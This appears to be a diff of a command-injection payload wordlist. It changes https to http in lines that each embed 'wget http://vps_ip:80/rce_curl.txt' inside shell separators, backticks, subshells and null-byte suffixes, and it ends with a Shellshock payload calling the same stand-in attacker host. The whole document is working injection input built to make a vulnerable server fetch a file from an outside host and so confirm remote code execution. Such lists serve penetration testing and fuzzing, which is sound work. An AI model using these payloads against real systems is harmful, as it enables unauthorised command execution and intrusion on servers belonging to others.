-&wget https://vps_ip:80/rce_curl.txt|
-&wget https://vps_ip:80/rce_curl.txt||
-'wget https://vps_ip:80/rce_curl.txt#
-'wget https://vps_ip:80/rce_curl.txt&
-'wget https://vps_ip:80/rce_curl.txt&&
-'wget https://vps_ip:80/rce_curl.txt;
-'wget https://vps_ip:80/rce_curl.txt|
-'wget https://vps_ip:80/rce_curl.txt||
-(wget https://vps_ip:80/rce_curl.txt)
-;wget https://vps_ip:80/rce_curl.txt#
-;wget https://vps_ip:80/rce_curl.txt&
-;wget https://vps_ip:80/rce_curl.txt&&
-;wget https://vps_ip:80/rce_curl.txt;
-;wget https://vps_ip:80/rce_curl.txt|
-;wget https://vps_ip:80/rce_curl.txt||
-`wget https://vps_ip:80/rce_curl.txt`
-{wget https://vps_ip:80/rce_curl.txt}
-||wget https://vps_ip:80/rce_curl.txt#
-||wget https://vps_ip:80/rce_curl.txt&
-||wget https://vps_ip:80/rce_curl.txt&&
-||wget https://vps_ip:80/rce_curl.txt;
-||wget https://vps_ip:80/rce_curl.txt|
-||wget https://vps_ip:80/rce_curl.txt||
-|wget https://vps_ip:80/rce_curl.txt#
-|wget https://vps_ip:80/rce_curl.txt&
-|wget https://vps_ip:80/rce_curl.txt&&
-|wget https://vps_ip:80/rce_curl.txt;
-|wget https://vps_ip:80/rce_curl.txt|
-|wget https://vps_ip:80/rce_curl.txt||
-wget https://vps_ip:80/rce_curl.txt
-wget https://vps_ip:80/rce_curl.txt#
-wget https://vps_ip:80/rce_curl.txt&
-wget https://vps_ip:80/rce_curl.txt&&
-wget https://vps_ip:80/rce_curl.txt;
-wget https://vps_ip:80/rce_curl.txt|
-wget https://vps_ip:80/rce_curl.txt||
-"wget https://vps_ip:80/rce_curl.txt%00
-&&wget https://vps_ip:80/rce_curl.txt%00
-&wget https://vps_ip:80/rce_curl.txt%00
-'wget https://vps_ip:80/rce_curl.txt%00
-;wget https://vps_ip:80/rce_curl.txt%00
-||wget https://vps_ip:80/rce_curl.txt%00
-|wget https://vps_ip:80/rce_curl.txt%00
-wget https://vps_ip:80/rce_curl.txt%00
+"wget http://vps_ip:80/rce_curl.txt#
+"wget http://vps_ip:80/rce_curl.txt&
+"wget http://vps_ip:80/rce_curl.txt&&
+"wget http://vps_ip:80/rce_curl.txt;
+"wget http://vps_ip:80/rce_curl.txt|
+"wget http://vps_ip:80/rce_curl.txt||
+&&wget http://vps_ip:80/rce_curl.txt#
+&&wget http://vps_ip:80/rce_curl.txt&
+&&wget http://vps_ip:80/rce_curl.txt&&
+&&wget http://vps_ip:80/rce_curl.txt;
+&&wget http://vps_ip:80/rce_curl.txt|
+&&wget http://vps_ip:80/rce_curl.txt||
+&wget http://vps_ip:80/rce_curl.txt#
+&wget http://vps_ip:80/rce_curl.txt&
+&wget http://vps_ip:80/rce_curl.txt&&
+&wget http://vps_ip:80/rce_curl.txt;
+&wget http://vps_ip:80/rce_curl.txt|
+&wget http://vps_ip:80/rce_curl.txt||
+'wget http://vps_ip:80/rce_curl.txt#
+'wget http://vps_ip:80/rce_curl.txt&
+'wget http://vps_ip:80/rce_curl.txt&&
+'wget http://vps_ip:80/rce_curl.txt;
+'wget http://vps_ip:80/rce_curl.txt|
+'wget http://vps_ip:80/rce_curl.txt||
+(wget http://vps_ip:80/rce_curl.txt)
+;wget http://vps_ip:80/rce_curl.txt#
+;wget http://vps_ip:80/rce_curl.txt&
+;wget http://vps_ip:80/rce_curl.txt&&
+;wget http://vps_ip:80/rce_curl.txt;
+;wget http://vps_ip:80/rce_curl.txt|
+;wget http://vps_ip:80/rce_curl.txt||
+`wget http://vps_ip:80/rce_curl.txt`
+{wget http://vps_ip:80/rce_curl.txt}
+||wget http://vps_ip:80/rce_curl.txt#
+||wget http://vps_ip:80/rce_curl.txt&
+||wget http://vps_ip:80/rce_curl.txt&&
+||wget http://vps_ip:80/rce_curl.txt;
+||wget http://vps_ip:80/rce_curl.txt|
+||wget http://vps_ip:80/rce_curl.txt||
+|wget http://vps_ip:80/rce_curl.txt#
+|wget http://vps_ip:80/rce_curl.txt&
+|wget http://vps_ip:80/rce_curl.txt&&
+|wget http://vps_ip:80/rce_curl.txt;
+|wget http://vps_ip:80/rce_curl.txt|
+|wget http://vps_ip:80/rce_curl.txt||
+wget http://vps_ip:80/rce_curl.txt
+wget http://vps_ip:80/rce_curl.txt#
+wget http://vps_ip:80/rce_curl.txt&
+wget http://vps_ip:80/rce_curl.txt&&
+wget http://vps_ip:80/rce_curl.txt;
+wget http://vps_ip:80/rce_curl.txt|
+wget http://vps_ip:80/rce_curl.txt||
+"wget http://vps_ip:80/rce_curl.txt%00
+&&wget http://vps_ip:80/rce_curl.txt%00
+&wget http://vps_ip:80/rce_curl.txt%00
+'wget http://vps_ip:80/rce_curl.txt%00
+;wget http://vps_ip:80/rce_curl.txt%00
+||wget http://vps_ip:80/rce_curl.txt%00
+|wget http://vps_ip:80/rce_curl.txt%00
+wget http://vps_ip:80/rce_curl.txt%00
 & wget http://vps_ip:80/.testing/rce.txt
 | wget http://vps_ip:80/.testing/rce.txt
 () { :;}; wget http://vps_ip:80/.testing/shellshock.txt?vuln=11
